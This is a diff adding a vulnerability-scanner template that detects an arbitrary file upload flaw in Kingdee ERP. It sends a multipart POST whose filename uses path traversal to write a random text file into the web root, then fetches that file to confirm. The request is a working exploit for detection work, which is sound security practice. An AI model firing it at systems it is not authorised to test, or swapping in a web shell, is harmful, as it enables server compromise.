@@ -1,0 +1,47 @@
+id: kingdee-erp-file-upload-ct-949212
+info:
+  name: Kingdee ERP File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a file upload vulnerability in Kingdee ERP. It allows an attacker to upload arbitrary files to the server.
+
+variables:
+  s1: "{{rand_int(10000, 99999)}}"
+  s2: "{{to_lower(rand_base(8))}}"
+  rboundary: "{{to_lower(rand_base(8))}}"
+
+http:
+  - id: "upload-file"
+    method: POST
+    path:
+      - "{{BaseURL}}/k3cloud/SRM/ScpSupRegHandler"
+    headers:
+      Content-Type: "multipart/form-data; boundary={{rboundary}}"
+    body: |
+      --{{rboundary}}\r\nContent-Disposition: form-data; name="dbId_v"\r\n\r\n.\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name="FID"\r\n\r\n2022\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{s2}}.txt"\r\nContent-Type: text/plain\r\n\r\n{{s1}}\r\n\r\n--{{rboundary}}--
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
+
+  - id: "validate-upload"
+    method: GET
+    path:
+      - "{{BaseURL}}/k3cloud/uploadfiles/{{s2}}.txt"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{s1}}"
